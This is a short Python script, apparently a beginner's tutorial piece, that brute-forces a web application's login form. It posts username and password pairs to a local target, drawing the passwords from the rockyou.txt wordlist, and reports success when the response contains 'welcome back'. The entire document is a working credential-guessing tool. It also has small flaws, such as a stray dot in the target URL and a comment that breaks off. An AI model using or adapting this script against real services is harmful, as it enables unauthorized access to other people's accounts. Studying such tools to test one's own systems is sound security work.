import requests  # Since it's a webapp, we're going to use the requests package to interact with it
import sys  # We need it for our progress bar

target = "http://127.0.0.1.:5000"  # This is our target webapp we're trying to brute force
usernames = ["admin", "user", "test"]  # This is our list for usernames we want to try on the webapp
passwords = "rockyou.txt"  # This is going to be our password file
needle = "welcome back"  # This needle is what we should see from the web app when

for username in usernames:
    with open(passwords, "r", encoding='latin-1') as password_list:
        try:
            for password in password_list:
                password = password.strip("\n").encode("latin-1")
                sys.stdout.write("[X] Attempting user:password -> {} :{}".format(username, password.decode("latin-1")))
                sys.stdout.flush()  # We need to flash the buffer after we write the file
                r = requests.post(target, data={"username": username, "password": password}, timeout=0.1)
                if needle.encode() in r.content:  # Checks if the needle is in the response of the web app
                    sys.stdout.write("\n")
                    sys.stdout.write(
                        "\t[>>>>] Valid password '{}' found for user '{}'!".format(password.decode("latin-1"), username))
                    sys.exit()  # We can finish
            sys.stdout.flush()  # It flushes the buffer if it fails to crack the password
            sys.stdout.write("\n")
            sys.stdout.write("\tNo password found for '{}'!".format(username))
        except requests.ConnectionError:
            print("\nUnable to connect!")
            break
        except requests.ReadTimeout:
            print("\nToo slow tryning to read the content of the site")
            break
        except requests.Timeout:
            print("\nToo slow to get the request through")
        except KeyboardInterrupt:
            print("Aborted by user!")
            break
        except:
            print("\nA bug I don't know about yet.")
            break